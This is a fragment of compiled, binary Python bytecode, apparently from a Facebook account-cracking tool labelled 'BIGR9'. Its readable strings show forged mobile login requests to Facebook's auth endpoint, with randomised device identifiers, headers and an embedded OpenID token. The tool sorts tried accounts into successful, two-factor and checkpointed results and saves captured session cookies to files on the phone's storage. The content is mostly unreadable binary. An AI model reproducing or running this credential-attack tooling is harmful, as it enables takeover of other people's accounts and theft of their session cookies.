r(\000\000\000\332\t<genexpr>z\031newidx.<locals>.<genexpr>\027\001\000\000\363\032\000\000\000\350\000\370\200\000\320$M\301H\270q\244V\247]\241]\2646\327%:\301H\371\363\004\000\000\000\202#%\001\351\002\000\000\000\332\004adid\332\006format\332\004json\332\tdevice_id\332\020family_device_id\332\027secure_family_device_id\332\003cpl\332\004true\332\007try_num\332\005email\332\010password\332\006method\372\nauth.login\332\030generate_analytics_claim\332\014community_id\332\013sim_serials\372\030['80973453345210784798']\332\013openid_flow\332\randroid_login\332\017openid_provider\332\006google\332\ropenid_emails\372\017['01710940017']\332\ropenid_tokens\341\366\003\000\000['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hl""iZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']\332 fb4a_shared_phone_cpl_experiment\332&fb4a_shared_phone_nonce_cpl_at_risk_v3\332\033fb4a_shared_phone_cpl_group\332\021enable_v3_at_risk\332\016enroll_misauth\332\005false\332\030generate_session_cookies\332\021error_detail_type\332\024button_with_disabled\332\006source\332\020account_recovery\332\023generate_machine_id\332\007jazoest\332\0042980\332\017meta_inf_fbmeta\332\013V2_UNTAGGED\332\020encrypted_msisdn\332\032currently_logged_in_userid\332\006locale\332\023client_country_code\332\002US\332\030fb_api_req_friendly_name\332\013autheticate\332\023fb_api_caller_class\332\017Fb4aAuthHandler\332 882a8490361da98702bf97a021ddc14dr\366\000\000\000\332 4c854da0db9429f4913c2a1b221c1d30\251\003\332\007api_key\332\014access_token\332\003sig\332\004Host\372\024b-graph.facebook.com\372\014Content-Type\372!application/x-www-form-urlencoded\372\017Accept-Encoding\372\rgzip, deflate\332\nConnection\372\nkeep-alive\332\004POST\372\022/auth/login HTTP/2\332\010Priority\372\006u=3, i\372\014X-Fb-Sim-Hni\332\00564301\372\014X-Fb-Net-Hni\372\027X-Fb-Connection-Quality\332\004GOOD\372\nZero-Rated\372\nUser-Agent\332\tEXCELLENT\332\rAuthorization\372\nOAuth null\372\031X-Fb-Connection-Bandwidth\332\01024807555\372\024X-Fb-Connection-Type\372\nMOBILE.LTE\332\0046060\332\005False\332\014authenticate\332\007unknown\332\005Liger\332\004True\332\0042126\251\010z\021X-Fb-Device-Group\372\020X-Tigon-Is-Retryz\022X-Fb-Friendly-Namez\033X-Fb-Request-Analytics-Tagsz\020X-Fb-Http-Enginez\016X-Fb-Client-Ipz\023X-Fb-Server-Clusterz\016Content-Length\372'https://b-graph.facebook.com/auth/login\372KLogin approvals are on. Expect an SMS shortly with a code to use for log in\251\002\332\004data\332\007headers\332\013session_key\372\025\r\r\033[1;32m [BIGR9-OK] \372\003 | \372\007\033[1;97mr-\000\000\000c\001\000\000\000\000\000\000\000\000\000\000\000\004\000\000\0003\000\000\000""\3638\000\000\000K\000\001\000\227\000|\000]\022\000\000}\001|\001d\000\031\000\000\000d\001z\000\000\000|\001d\002\031\000\000\000z\000\000\000\226\001\227\001\001\000\214\024\004\000y\003\255\003w\001\251\004r\364\000\000\000\332\001=\332\005valueNr\216\000\000\000\251\002rf\001\000\000r\343\000\000\000s\002\000\000\000  r(\000\000\000rh\001\000\000z\031newidx.<locals>.<genexpr>\\\001\000\000\363%\000\000\000\350\000\370\200\000\3207p\321Zo\320UV\270\001\270&\271\t\300#\271\r\300a\310\007\301j\3258P\321Zo\371\363\004\000\000\000\202\030\032\001\332\017session_cookies\372\022\r\r\033[1;33m Cookie: \372\027/sdcard/BIGR9-M1-OK.txt\332\001ar\302\000\000\000rw\000\000\000r\275\000\000\000\372\025\r\r\033[1;34m [BIGR9-2F] \372\020www.facebook.com\332\005error\332\007message\372\025\r\r\033[1;31m [BIGR9-CP] \372\027/sdcard/BIGR9-M1-CP.txtr\005\000\000\000\251)\332\003sys\332\006stdout\332\005write\332\004loopr\266\000\000\000r\326\000\000\000\332\005flushr\322\000\000\000\332\007replace\332\005lowerr\035\000\000\000r \000\000\000r\037\000\000\000\332\006device\332\006sim_idr\036\000\000\000r!\000\000\000\332\006Random\332\004join\332\007choices\332\006string\332\thexdigits\332\004uuid\332\005uuid4rd\001\000\000r\316\000\000\000r0\000\000\000r\330\000\000\000\332\004postrn\001\000\000r\214\000\000\000r\306\000\000\000r\317\000\000\000r\320\000\000\000r\327\000\000\000r\331\000\000\000r\332\000\000\000r\312\000\000\000r\313\000\000\000\332\004api3\332\tException\2510r\350\000\000\000r\351\000\000\000r\352\000\000\000\332\002fn\332\002ln\332\002pw\332\003pas\332\013accessToken\332\004fbav\332\004fbbvr~\000\000\000r\000\000\000r\200\000\000\000r\201\000\000\000r$\000\000\000r\202\000\000\000r\203\000\000\000r\204\000\000\000r\205\000\000\000r\206\000\000\000r\207\000\000\000\332\004fbfw\332\004fbrv\332\004fban\332\004fbpnr\"\000\000\000\332\006inform\332\003ams\332\007networkr'\000\000\000\332\013random_seedrl\001\000\000ro\001\000\000\332\006secure\332\006familyr\335\000""\000\000r{\001\000\000\332\002li\332\003li2\332\002j1r\221\001\000\000r\312\001\000\000r\313\001\000\000\332\003url\332\003twf\332\002po\332\004cokir&\000\000\000s0\000\000\000                                                r(\000\000\000r\325\000\000\000r\325\000\000\000\353\000\000\000\363\r\010\000\000\200\000\360\002K\002\t\025\344\020\023\227\n\221\n\327\020 \322\020 \326mq\324ru\324vy\325rz\320!{\324\020|\364\000\000~\001A\002\367\000\000~\001H\002\361\000\000~\001H\002\367\000\000~\001N\002\361\000\000~\001N\002\364\000\000~\001P\002\330\025\032\227[\221[\240\023\323\025%\240a\321\025(\220\002\360\002\003\021 \330\035\"\237[\231[\250\023\323\035-\250a\321\0350\230\002\364\006\000\033#\220B\330\036 \237j\231j\250\027\260\022\267\030\261\030\263\032\323\036<\327\036D\321\036D\300W\310R\323\036P\327\036X\321\036X\320Y_\320`b\327`h\321`h\323`j\323\036k\327\036s\321\036s\320tz\320{}\323\036~\367\000\000\037G\002\361\000\000\037G\002\360\000\000H\002N\002\360\000\000O\002T\002\363\000\000\037U\002\367\000\000\037]\002\361\000\000\037]\002\360\000\000^\002d\002\360\000\000e\002j\002\367\000\000e\002p\002\361\000\000e\002p\002\363\000\000e\002r\002\363\000\000\037s\002\230\003\330&[\230\013\334\"(\247.\241.\260\023\260S\323\"9\320!:\270%\304\006\307\016\301\016\310r\320RT\323@U\320?V\320VW\324X^\327Xf\321Xf\320gj\320kn\323Xo\320Wp\320\037q\230\004\334\037\"\2446\247>\241>\260)\270I\323#F\323\037G\230\004\334*0\3201B\321*C\230\017\334 &\240w\241\017\230\005\334 &\240w\241\017\230\005\334\037%\240f\231~\230\004\334\037%\230\004\334\037%\240f\231~\230\004\334\037%\240f\231~\230\004\334\037%\240f\231~\230\004\334\037%\240f\231~\230\004\334\037%\240f\231~\230\004\334\037%\240f\231~\230\004\330\037\"\230\004\330\037\"\230\004\330\037%\230\004\330\0374\230\004\334\035#\237]\231]\250G\260G\320+<\323\035=\230\002\334!'\247\035\241\035\362\000\0000F\013\363\000\000\"G\013\230\006\334\036!\244&\247.\241.\260\023\260S\323\"9\323\036:\2707\321\036B\3043\304v\327GW\321GW\320XY""\320Z\\\323G]\323C^\321\036^\324_b\324ci\327cq\321cq\320ru\320vy\323cz\323_{\321\036{\230\003\334\"(\247-\241-\3220s\323\"t\230\007\360\002\000\037]\023\230\002\334&,\247m\241m\243o\230\013\334\037\"\2402\2477\2417\250;\327+>\321+>\274v\327?O\321?O\320SU\320+>\323+V\323#W\323\037X\230\004\334$'\254\004\257\n\251\n\253\014\323$5\230\t\334!$\244T\247Z\241Z\243\\\323!2\230\006\334!$\244T\247Z\241Z\243\\\323!2\230\006\330&[\230\013\334\034\037\240\002\247\007\241\007\250\013\327(;\321(;\274F\277M\271M\310R\320(;\323(P\323 Q\323\034R\230\002\330(*\2502\250$\250b\240k\230\013\332\035.\230\002\334\036$\237m\231m\250B\323\036/\230\003\330\035\037\237W\231W\321$M\304E\310!\304H\323$M\323\035M\230\002\330\"%\240b\241&\230\007\360\002$ *\240\006\250\004\360\000$ *\330\000\010\210&\360\003$ *\340\000\013\214S\224\024\227\032\221\032\223\034\323\r\036\360\005$ *\360\006\000\001\023\224C\234\004\237\n\231\n\233\014\323\024%\360\007$ *\360\010\000\001\032\2343\234t\237z\231z\233|\323\033,\360\t$ *\360\n\000\001\006\200v\360\013$ *\360\014\000\001\n\2103\360\r$ *\360\016\000\001\010\210\023\360\017$ *\360\020\000\001\013\210C\360\021$ *\360\022\000\001\t\210,\360\023$ *\360\024\000\001\033\2303\360\025$ *\360\026\000\001\017\210r\360\027$ *\360\030\000\001\006\200f\360\031$ *\360\032\000\001\n\210#\360\033$ *\360\034\000\001\016\320\017)\360\035$ *\360\036\000\001\016\210\360\037$ *\360 \000\001\022\2208\361!$ *\360\"\000\001\020\320\021\"\360#$ *\360$\000\001\020\360\000\000\022J\020\360%$ *\360&\000\001#\320#K\360'$ *\360(\000\001\036\320\0361\360)$ *\360*\000\001\021\220\027\360+$ *\360,\000\001\033\2303\360-$ *\360.\000\001\024\320\024*\360/$ *\3600\000\001\t\320\t\033\3601$ *\3602\000\001\026\220c\3603$ *\3604\000\001\n\210&\3605$ *\3606\000\001\022\220-\3607$ *\3608\000\001\023\2202\3609$ *\360:\000\001\035\230S\360;$ *\360<\000\001\t\210'\360=$ *\360>\000\001\026\220t\360?$ *\360@\001\000\001\033\230=\360A\001$ *\360B\001\000\001\026\320\026'\361C\001$ *\360D\001\000\013-""\330\017C\330\006(\362I\001$ *\230\004\360J\001\030!\032\240\026\320)?\360\000\030!\032\330\000\016\320\0203\360\003\030!\032\340\000\021\220?\360\005\030!\032\360\006\000\001\r\210l\360\007\030!\032\360\010\000\001\007\320\010\034\360\t\030!\032\360\n\000\001\007\320\010\036\360\013\030!\032\360\014\000\001\013\210H\360\r\030!\032\360\016\000\001\017\320\0203\360\017\030!\032\360\020\000\001\017\220\007\360\021\030!\032\360\022\000\001\017\220\007\360\023\030!\032\360\024\000\001\032\2306\360\025\030!\032\360\026\000\001\r\210c\360\027\030!\032\360\030\000\001\r\324\016\037\323\016!\360\031\030!\032\360\032\000\001\032\230;\360\033\030!\032\360\034\000\001\020\220\034\360\035\030!\032\360\036\000\001\034\230Z\360\037\030!\032\360 \000\001\027\230\014\360!\030!\032\360\"\000\026\034\330\024\033\330\026$\330\037(\330\024\033\330\022\030\330\027\035\330\022\030\3621\030!\032\230\007\3602\000\037H\001\230\003\330\036z\230\003\334\035%\237]\231]\2503\260D\300\027\324\035I\327\035N\321\035N\323\035P\230\002\330\033(\250B\321\033.\334(-\320.J\3103\321.N\310u\321.T\320UX\321.X\320Ye\321.e\324(f\330/2\257x\251x\3217p\320Z\\\320]n\322Zo\3237p\323/p\250\004\334(-\320.G\310\004\321.L\324(M\334(,\320-F\300s\323(K\327(Q\321(Q\320RU\320VY\321RY\320Z]\321R]\320^a\321Ra\320bf\321Rf\320gk\321Rk\324(l\334(+\257\n\251\n\2603\254\017\331(-\330\035 \244C\250\002\243G\231^\330+.\264#\253:\33405\3206R\320SV\3216V\320W\\\3216\\\320]`\3216`\3240a\33003\267\n\261\n\2703\264\017\33105\330\035/\2602\260g\261;\270y\3213I\321\035I\330+.\264#\251:\33405\3208R\320TW\3216W\320X]\3216]\320^a\3216a\320bn\3216n\3240o\33404\3205N\310s\3230S\3270Y\3210Y\320Z]\320^a\321Za\320be\321Ze\320fj\321Zj\3240k\33105\364\006\00015\3205N\310s\3230S\3270Y\3210Y\320Z]\320^a\321Za\320be\321Ze\320fj\321Zj\3240k\33105\361\006\000)1\360{\003\000\033#\364|\003\000\021\025\220a\221\007\221\004\370\360A\004\001\021 \330\035\037\233\002\373\364@\004\000\020\030\327\017\"\321\017\"\327\0172\321\0172\362\000\002\t)\334\020""\024\227\n\221\n\2301\224\r\334\020\024\220S\230\025\230x\326\020(\334\017\030\362\000\001\t\025\334\020\024\373\360\003\001\t\025\372\3638\000\000\000\202A)X0\000\301,\024X&\000\302\000S;X0\000\325=B(X0\000\330&\004X-\003\330*\006X0\000\3300?Z\003\003\3311\010Z\003\003\331>\005Z\003\003c\003\000\000\000\000\000\000\000\000\000\000\000\013\000\000\000\003\000\000\000\363\014\r\000\000\227\000\t\000t\000\000\000\000\000\000\000\000\000j\002\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000j\005\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\001t\006\000\000\000\000\000\000\000\000\233\001d\002t\t\000\000\000\000\000\000\000\000t\n\000\000\000\000\000\000\000\000\253\001\000\000\000\000\000\000\233\001d\003\235\005\253\001\000\000\000\000\000\000\001\000t\000\000\000\000\000\000\000\000\000j\002\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000j\r\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\001\000|\001j\017\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\004\253\001\000\000\000\000\000\000d\005\031\000\000\000}\003\t\000|\001j\017\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\004\253\001\000\000\000\000\000\000d\006\031\000\000\000}\004|\002D\000\220\005]\226\000\000}\005|\005j\021\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\007|\003j\023\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\253\002\000\000\000\000\000\000j\021\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\010|\003\253\002\000\000\000\000\000\000j\021\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\t|\004j\023\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\253\002\000\000\000\000\000\000j\021\000\000\000\000\000\000\000\000\000\000\000""\000\000\000\000\000\000\000d\n|\004\253\002\000\000\000\000\000\000j\021\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\013|\001\253\002\000\000\000\000\000\000j\021\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\014|\001j\023\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\253\002\000\000\000\000\000\000}\006d\r}\007t\025\000\000\000\000\000\000\000\000j\026\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\016d\017\253\002\000\000\000\000\000\000\233\000d\020t\025\000\000\000\000\000\000\000\000j\026\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\021d\022\253\002\000\000\000\000\000\000\233\000d\023t\025\000\000\000\000\000\000\000\000j\026\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\016d\017\253\002\000\000\000\000\000\000\233\000\235\005}\010t\031\000\000\000\000\000\000\000\000t\025\000\000\000\000\000\000\000\000j\026\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\024d\025\253\002\000\000\000\000\000\000\253\001\000\000\000\000\000\000}\tt\032\000\000\000\000\000\000\000\000d\026\031\000\000\000}\nt\032\000\000\000\000\000\000\000\000d\027\031\000\000\000}\013t\032\000\000\000\000\000\000\000\000d\030\031\000\000\000}\014t\032\000\000\000\000\000\000\000\000d\031\031\000\000\000}\rt\034\000\000\000\000\000\000\000\000}\016t\032\000\000\000\000\000\000\000\000d\032\031\000\000\000}\017t\032\000\000\000\000\000\000\000\000d\033\031\000\000\000}\020t\032\000\000\000\000\000\000\000\000d\034\031\000\000\000}\021t\032\000\000\000\000\000\000\000\000d\035\031\000\000\000}\022t\032\000\000\000\000\000\000\000\000d\036\031\000\000\000}\023t\032\000\000\000\000\000\000\000\000d\037\031\000\000\000}\024d }\025d!}\026d\"}\027d#}\030t\025\000\000\000\000\000\000\000\000j\036\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d$d%g\002\253\001""\000\000\000\000\000\000}\031t\025\000\000\000\000\000\000\000\000j\036\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000g\000d&\242\001\253\001\000\000\000\000\000\000}\032t\031\000\000\000\000\000\000\000\000t\025\000\000\000\000\000\000\000\000j\026\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\016d'\253\002\000\000\000\000\000\000\253\001\000\000\000\000\000\000d\020z\000\000\000t\031\000\000\000\000\000\000\000\000t\025\000\000\000\000\000\000\000\000j \000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d(d)\253\002\000\000\000\000\000\000\253\001\000\000\000\000\000\000z\000\000\000t\031\000\000\000\000\000\000\000\000t\025\000\000\000\000\000\000\000\000j\026\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\016d'\253\002\000\000\000\000\000\000\253\001\000\000\000\000\000\000z\000\000\000}\033t\025\000\000\000\000\000\000\000\000j\036\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000g\000d*\242\001\253\001\000\000\000\000\000\000}\034d+}\035t\025\000\000\000\000\000\000\000\000j\"\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000}\036t\031\000\000\000\000\000\000\000\000d,j%\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000|\036j'\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000t(\000\000\000\000\000\000\000\000j*\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d-\254.\253\002\000\000\000\000\000\000\253\001\000\000\000\000\000\000\253\001\000\000\000\000\000\000}\037t\031\000\000\000\000\000\000\000\000t-\000\000\000\000\000\000\000\000j.\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\253\001\000\000\000\000\000\000} t\031\000\000\000\000\000\000\000\000t-\000\000\000\000\000\000\000\000j.\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000""\000\000\000\000\000\000\253\001\000\000\000\000\000\000}!t\031\000\000\000\000\000\000\000\000t-\000\000\000\000\000\000\000\000j.\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\253\001\000\000\000\000\000\000}\"d\r}\007t\031\000\000\000\000\000\000\000\000d,j%\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000|\036j'\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000t(\000\000\000\000\000\000\000\000j0\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d/\254.\253\002\000\000\000\000\000\000\253\001\000\000\000\000\000\000\253\001\000\000\000\000\000\000}#d0|#\233\000d1\235\003}$g\000d2\242\001}%t\025\000\000\000\000\000\000\000\000j\036\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000|%\253\001\000\000\000\000\000\000}&d,j%\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d3\204\000t3\000\000\000\000\000\000\000\000d4\253\001\000\000\000\000\000\000D\000\253\000\000\000\000\000\000\000\253\001\000\000\000\000\000\000}'|&|'z\000\000\000}(i\000d5|\037\223\001d6d7\223\001d8t\031\000\000\000\000\000\000\000\000t-\000\000\000\000\000\000\000\000j.\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\253\001\000\000\000\000\000\000\223\001d9t\031\000\000\000\000\000\000\000\000t-\000\000\000\000\000\000\000\000j.\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\253\001\000\000\000\000\000\000\223\001d:t\031\000\000\000\000\000\000\000\000t-\000\000\000\000\000\000\000\000j.\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\253\001\000\000\000\000\000\000\223\001d;d<\223\001d=d \223\001d>|\000\223\001d?|\006\223\001d@dA\223\001dBd \223\001dCd,\223\001d;d<\223\001d=d \223\001dDdE\223\001dFdG\223\001dHdI\223\001i\000dJdK\223\001dLdM\223\001dNdO\223\001dP""dQ\223\001dRdS\223\001dTd \223\001dUdV\223\001dWdX\223\001dYd \223\001dZd[\223\001d\\d]\223\001d^d,\223\001d_d!\223\001d`d$\223\001dadb\223\001dcdd\223\001dedf\223\001\245\001dgdhdidj\234\003\245\001})i\000dkdl\223\001dmdn\223\001dodp\223\001dqdr\223\001dsdt\223\001dkdl\223\001dudv\223\001dmdn\223\001dwdx\223\001dydx\223\001dzd{\223\001d|d!\223\001d}t5\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\223\001dzd~\223\001dd\200\223\001d\201d\202\223\001d\203d\204\223\001d\205d\206d\207d\210d\211d\212d\212d\213d\214\234\010\245\001}*d\215}+d\216},t7\000\000\000\000\000\000\000\000j8\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000|+|)|*\254\217\253\003\000\000\000\000\000\000j;\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000}-d\220|-v\000r\201t=\000\000\000\000\000\000\000\000d\221|\000z\000\000\000d\222z\000\000\000|\006z\000\000\000d\223z\000\000\000\253\001\000\000\000\000\000\000\001\000d\224j%\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\225\204\000|-d\226\031\000\000\000D\000\253\000\000\000\000\000\000\000\253\001\000\000\000\000\000\000}.t=\000\000\000\000\000\000\000\000d\227|.z\000\000\000\253\001\000\000\000\000\000\000\001\000t?\000\000\000\000\000\000\000\000d\230d\231\253\002\000\000\000\000\000\000j\005\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000|\000d\232z\000\000\000|\006z\000\000\000d\232z\000\000\000|.z\000\000\000d\233z\000\000\000\253\001\000\000\000\000\000\000\001\000t\n\000\000\000\000\000\000\000\000jA\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000|\000\253\001\000\000\000\000\000\000\001\000\001\000n\266|,t\031\000\000\000\000\000\000\000\000|-\253\001\000\000\000\000\000\000v\000r1d\234tB\000\000\000\000\000\000\000\000v\000s\002\220\004\214\373t=\000\000\000\000\000\000\000\000d\235|\000z\000\000\000d\222z\000\000\000|\006z\000\000\000\253\001\000\000\000\000\000\000""\001\000|,jA\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000|\000\253\001\000\000\000\000\000\000\001\000\001\000nxd\236|-d\237\031\000\000\000d\240\031\000\000\000v\000rkd\234tB\000\000\000\000\000\000\000\000v\000r=t=\000\000\000\000\000\000\000\000d\241|\000z\000\000\000d\222z\000\000\000|\006z\000\000\000d\223z\000\000\000\253\001\000\000\000\000\000\000\001\000t?\000\000\000\000\000\000\000\000d\242d\231\253\002\000\000\000\000\000\000j\005\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000|\000d\232z\000\000\000|\006z\000\000\000d\233z\000\000\000\253\001\000\000\000\000\000\000\001\000\001\000n)t?\000\000\000\000\000\000\000\000d\242d\231\253\002\000\000\000\000\000\000j\005\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000|\000d\232z\000\000\000|\006z\000\000\000d\233z\000\000\000\253\001\000\000\000\000\000\000\001\000\001\000n\003\220\005\214\231\004\000t\006\000\000\000\000\000\000\000\000d\006z\r\000\000a\003y\000#\000\001\000|\003}\004Y\000\220\005\214\255x\003Y\000w\001#\000t6\000\000\000\000\000\000\000\000jF\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000jH\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000$\000r%\001\000tK\000\000\000\000\000\000\000\000jL\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\243\253\001\000\000\000\000\000\000\001\000tO\000\000\000\000\000\000\000\000|\000|\001|\002\253\003\000\000\000\000\000\000\001\000Y\000y\000tP\000\000\000\000\000\000\000\000$\000r\n}/Y\000d\000}/~/y\000d\000}/~/w\001w\000x\003Y\000w\001)\244Nr\354\000\000\000r\355\000\000\000r\356\000\000\000r(\000\000\000r\002\000\000\000rR\000\000\000r\357\000\000\000r\360\000\000\000r\361\000\000\000r\362\000\000\000r\363\000\000\000r\364\000\000\000r\365\000\000\000r\367\000\000\000rS\000\000\000r\030\000\000\000r\026\000\000\000r,\000\000\000rX\000\000\000r\370\000\000\000r\371\000\000\000r~\000\000\000r\000\000\000r\200""\000\000\000r\201\000\000\000r\202\000\000\000r\203\000\000\000r\204\000\000\000r\205\000\000\000r\206\000\000\000r\207\000\000\000r{\000\000\000rV\000\000\000r\372\000\000\000r\020\000\000\000r\007\000\000\000r\010\000\000\000r\373\000\000\000rQ\001\000\000r\031\000\000\000r\032\000\000\000rR\001\000\000rV\001\000\000ru\000\000\000rW\001\000\000rX\001\000\000rZ\001\000\000r[\001\000\000r\\\001\000\000r]\001\000\000c\001\000\000\000\000\000\000\000\000\000\000\000\004\000\000\0003\000\000\000\363N\000\000\000K\000\001\000\227\000|\000]\035\000\000}\001t\001\000\000\000\000\000\000\000\000j\002\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000t\004\000\000\000\000\000\000\000\000\253\001\000\000\000\000\000\000\226\001\227\001\001\000\214\037\004\000y\000\255\003w\001rb\001\000\000rc\001\000\000re\001\000\000s\002\000\000\000  r(\000\000\000rh\001\000\000z\027api1.<locals>.<genexpr>\244\001\000\000ri\001\000\000rj\001\000\000rk\001\000\000rl\001\000\000rm\001\000\000rn\001\000\000ro\001\000\000rp\001\000\000rq\001\000\000rr\001\000\000rs\001\000\000rt\001\000\000ru\001\000\000rv\001\000\000rw\001\000\000rx\001\000\000ry\001\000\000rz\001\000\000r{\001\000\000r|\001\000\000r}\001\000\000r~\001\000\000r\001\000\000r\200\001\000\000r\201\001\000\000r\202\001\000\000r\203\001\000\000r\204\001\000\000r\205\001\000\000r\206\001\000\000r\207\001\000\000r\210\001\000\000r\211\001\000\000r\212\001\000\000r\213\001\000\000r\214\001\000\000r\215\001\000\000r\216\001\000\000r\217\001\000\000r\220\001\000\000r\221\001\000\000r\222\001\000\000r\223\001\000\000r\224\001\000\000r\225\001\000\000r\226\001\000\000r\227\001\000\000r\230\001\000\000r\231\001\000\000r\232\001\000\000r\233\001\000\000r\234\001\000\000r\235\001\000\000r\236\001\000\000r\366\000\000\000r\237\001\000\000r\240\001\000\000r\244\001\000\000r\245\001\000\000r\246\001\000\000r\247\001\000\000r\250\001\000\000r\251\001\000\000r\252\001\000\000r\253\001\000\000r\254\001\000\000r\255\001\000""\000r\256\001\000\000r\257\001\000\000r\260\001\000\000r\261\001\000\000r\262\001\000\000r\263\001\000\000r\264\001\000\000r\265\001\000\000r\266\001\000\000r\267\001\000\000r\270\001\000\000r\271\001\000\000r\272\001\000\000r\273\001\000\000r\274\001\000\000r\275\001\000\000r\276\001\000\000r\277\001\000\000r\300\001\000\000r\301\001\000\000r\302\001\000\000r\303\001\000\000r\304\001\000\000r\305\001\000\000r\307\001\000\000r\310\001\000\000r\311\001\000\000r\314\001\000\000r\315\001\000\000r\316\001\000\000r\317\001\000\000r-\000\000\000c\001\000\000\000\000\000\000\000\000\000\000\000\004\000\000\0003\000\000\000\3638\000\000\000K\000\001\000\227\000|\000]\022\000\000}\001|\001d\000\031\000\000\000d\001z\000\000\000|\001d\002\031\000\000\000z\000\000\000\226\001\227\001\001\000\214\024\004\000y\003\255\003w\001r\321\001\000\000r\216\000\000\000r\324\001\000\000s\002\000\000\000  r(\000\000\000rh\001\000\000z\027api1.<locals>.<genexpr>\351\001\000\000r\325\001\000\000r\326\001\000\000r\327\001\000\000r\330\001\000\000r\331\001\000\000r\332\001\000\000r\302\000\000\000rw\000\000\000r\275\000\000\000r\333\001\000\000r\334\001\000\000r\335\001\000\000r\336\001\000\000r\337\001\000\000r\340\001\000\000r\005\000\000\000r\341\001\000\000r\365\001\000\000s0\000\000\000                                                